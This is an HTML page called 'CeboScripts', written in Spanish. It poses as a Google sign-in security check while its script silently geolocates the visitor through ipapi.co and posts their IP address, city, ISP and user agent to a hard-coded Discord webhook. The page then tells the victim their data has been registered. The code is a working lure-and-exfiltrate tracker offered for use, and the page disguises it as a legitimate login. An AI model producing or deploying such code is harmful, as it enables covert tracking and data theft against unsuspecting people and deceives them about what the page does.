<!DOCTYPE html>
<html>
<head>
    <title>CeboScripts</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding: 50px; }
        .btn-google {
            background: #4285f4;
            color: #fff;
            padding: 15px 40px;
            border: none;
            border-radius: 5px;
            font-size: 1.2em;
            cursor: pointer;
        }
        .btn-google:hover { background: #357ae8; }
    </style>
</head>
<body>
    <h1>🔐 Verificación de seguridad</h1>
    <p>Para continuar, inicia sesión con Google</p>
    <button class="btn-google" onclick="iniciarSesion()">🔑 Iniciar sesión con Google</button>

    <script>
        // ======== CONFIGURACIÓN ========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";
        
        // Este es un Client ID público de ejemplo (NO es real, necesitas el tuyo)
        const GOOGLE_CLIENT_ID = "TU_CLIENT_ID.apps.googleusercontent.com";
        
        // URL de redirección (debe estar registrada en Google Console)
        const REDIRECT_URI = "https://tupagina.vercel.app/callback";

        // ======== FUNCIÓN QUE SÍ FUNCIONA ========
        function iniciarSesion() {
            // ✅ Esto NO se bloquea porque es iniciado por un clic
            const popup = window.open(
                `https://accounts.google.com/o/oauth2/v2/auth?` +
                `client_id=${GOOGLE_CLIENT_ID}&` +
                `redirect_uri=${REDIRECT_URI}&` +
                `response_type=token&` +
                `scope=email profile&` +
                `prompt=consent`,
                'googleAuth',
                'width=500,height=600,menubar=no,toolbar=no,location=no'
            );

            // Capturar datos del dispositivo
            capturarDatos();

            // Monitorear si el usuario completó el login
            const checkPopup = setInterval(() => {
                if (popup.closed) {
                    clearInterval(checkPopup);
                    document.body.innerHTML = `
                        <h1>✅ Proceso completado</h1>
                        <p>Tus datos han sido registrados.</p>
                    `;
                }
            }, 1000);
        }

        // ======== CAPTURAR DATOS ========
        async function capturarDatos() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                const info = {
                    ip: data.ip,
                    ciudad: data.city,
                    pais: data.country_name,
                    isp: data.org,
                    direccion: `${data.city}, ${data.region}, ${data.country_name}`
                };

                // Enviar a Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'CeboScripts',
                        content: '📢 Nuevo registro',
                        embeds: [{
                            color: 0xff0000,
                            title: 'Datos capturados',
                            fields: [
                                { name: '📍 Dirección', value: info.direccion, inline: false },
                                { name: '🌐 IP', value: info.ip, inline: true },
                                { name: '📱 Dispositivo', value: navigator.userAgent, inline: true },
                                { name: '📶 ISP', value: info.isp, inline: false }
                            ]
                        }]
                    })
                });
            } catch (e) {
                console.error('Error:', e);
            }
        }
    </script>
</body>
</html>
